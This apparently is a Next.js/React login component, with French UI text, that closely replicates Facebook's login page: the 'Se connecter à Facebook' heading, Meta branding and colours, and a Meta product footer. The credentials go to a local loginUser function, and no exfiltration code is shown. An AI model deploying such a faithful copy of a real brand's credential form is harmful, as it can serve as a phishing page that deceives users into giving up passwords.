"use client";

import { useEffect, useState, type CSSProperties } from "react";
import { useRouter } from "next/navigation";
import Logo from "@/components/Logo";
import MetaMark from "@/components/MetaMark";
import { getCurrentUser, loginUser } from "@/lib/auth";

// Proportions mesurées sur la page de référence (tout est relatif à la largeur du formulaire)
const fieldClass =
  "w-full border border-[#CED0D4] bg-white text-[#1C1E21] placeholder:text-[#65676B] outline-none focus:border-[#0064E0] focus:ring-1 focus:ring-[#0064E0]";
const fieldStyle: CSSProperties = {
  height: "11cqw",
  fontSize: "2.6cqw",
  paddingInline: "3.1cqw",
  borderRadius: "3.4cqw",
};
const pillStyle: CSSProperties = {
  height: "8.1cqw",
  fontSize: "2.6cqw",
  borderRadius: "999px",
};

// Illustration : posée à droite de la colonne de gauche
function Hero() {
  return (
    <div className="absolute right-[3%] top-[5%] hidden w-[70%] bg-white lg:block">
      {/* eslint-disable-next-line @next/next/no-img-element */}
      <img
        src="/capture.png"
        alt=""
        className="h-auto w-full mix-blend-multiply"
        style={{ filter: "brightness(1.13)" }}
      />
    </div>
  );
}

export default function LoginForm() {
  const router = useRouter();
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [busy, setBusy] = useState(false);

  // Si la personne est déjà connectée, on l'envoie directement à l'accueil
  useEffect(() => {
    getCurrentUser()
      .then((u) => {
        if (u) router.replace("/accueil");
      })
      .catch(() => {});
  }, [router]);

  async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    setError("");
    if (!identifier.trim() || !password) {
      setError("Entre ton adresse e-mail ou ton numéro de téléphone, et ton mot de passe.");
      return;
    }
    setBusy(true);
    try {
      const result = await loginUser(identifier, password);
      if (!result.ok) {
        setError(result.error ?? "Connexion impossible.");
        setBusy(false);
        return;
      }
      router.push("/accueil");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Une erreur est survenue. Réessaie.");
      setBusy(false);
    }
  }

  return (
    <div
      className="flex min-h-screen flex-col bg-white text-[#1C1E21]"
      style={{ fontFamily: "var(--font-geist-sans), Arial, Helvetica, sans-serif" }}
    >
      {/* Zone principale : sur grand écran, elle remplit la hauteur de la fenêtre */}
      <div className="flex flex-1 flex-col lg:h-[calc(100vh-30px)] lg:flex-none lg:flex-row">
        {/* Gauche : logo en haut, illustration à droite, slogan en bas */}
        <div className="relative lg:w-[57%] lg:flex-none lg:border-r lg:border-[#DADDE1]">
          <div className="px-6 pt-8 lg:absolute lg:left-[50px] lg:top-[60px] lg:p-0">
            <Logo size={72} />
          </div>

          <Hero />

          <h1 className="absolute bottom-[10%] left-[4%] z-10 hidden text-[clamp(44px,3.9vw,76px)] font-semibold leading-[1.15] tracking-tight lg:block">
            Explorez
            <br />
            les sujets
            <br />
            que <span className="text-[#0866FF]">vous</span>
            <br />
            <span className="text-[#0866FF]">aimez</span>
            <span className="ml-[0.06em] inline-block size-[0.15em] rounded-full bg-[#1C1E21]" />
          </h1>
        </div>

        {/* Droite : formulaire */}
        <div className="flex flex-1 items-center justify-center px-6 py-10 lg:flex-none lg:w-[43%] lg:px-[65px]">
          <div className="w-full max-w-[680px]" style={{ containerType: "inline-size" }}>
            <h2
              className="font-semibold"
              style={{ fontSize: "3.4cqw", lineHeight: 1.2, marginBottom: "4.4cqw" }}
            >
              Se connecter à Facebook
            </h2>

            <form
              onSubmit={handleSubmit}
              className="flex flex-col"
              style={{ gap: "2.2cqw" }}
            >
              <input
                type="text"
                value={identifier}
                onChange={(e) => setIdentifier(e.target.value)}
                placeholder="E-mail ou numéro de mobile"
                autoComplete="username"
                className={fieldClass}
                style={fieldStyle}
              />
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Mot de passe"
                autoComplete="current-password"
                className={fieldClass}
                style={fieldStyle}
              />

              {error && <p className="text-sm text-[#E41E3F]">{error}</p>}

              <button
                type="submit"
                disabled={busy}
                className="w-full cursor-pointer bg-[#0064E0] font-medium text-white hover:bg-[#0A72F0] disabled:opacity-70"
                style={{ ...pillStyle, marginTop: "2.2cqw" }}
              >
                {busy ? "Connexion..." : "Se connecter"}
              </button>

              <p
                className="text-center"
                style={{ fontSize: "2.6cqw", marginTop: "2.2cqw" }}
              >
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="font-medium hover:underline"
                >
                  Mot de passe oublié ?
                </a>
              </p>
            </form>

            <div style={{ marginTop: "12.3cqw" }}>
              <button
                type="button"
                onClick={() => window.location.assign("/inscription")}
                className="flex w-full cursor-pointer items-center justify-center border border-[#0064E0] font-medium text-[#0064E0] hover:bg-[#F0F6FF]"
                style={pillStyle}
              >
                Créer un nouveau compte
              </button>
              <div style={{ marginTop: "5cqw" }}>
                <MetaMark height={40 } />
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Pied de page */}
      <footer className="border-t border-[#DADDE1] px-6 py-6 text-xs text-[#65676B] lg:px-[18%]">
        <div className="flex flex-wrap gap-x-6 gap-y-2">
          <span>Français (France)</span>
          <span>English (US)</span>
          <span>العربية</span>
          <span>Español</span>
          <span>Deutsch</span>
          <span>Italiano</span>
          <span>Autres langues...</span>
        </div>
        <div className="mt-4 flex flex-wrap gap-x-4 gap-y-2">
          <span>S’inscrire</span>
          <span>Se connecter</span>
          <span>Messenger</span>
          <span>Facebook Lite</span>
          <span>Vidéo</span>
          <span>Meta Pay</span>
          <span>Meta AI</span>
          <span>Instagram</span>
          <span>Threads</span>
        </div>
      </footer>
    </div>
  );
}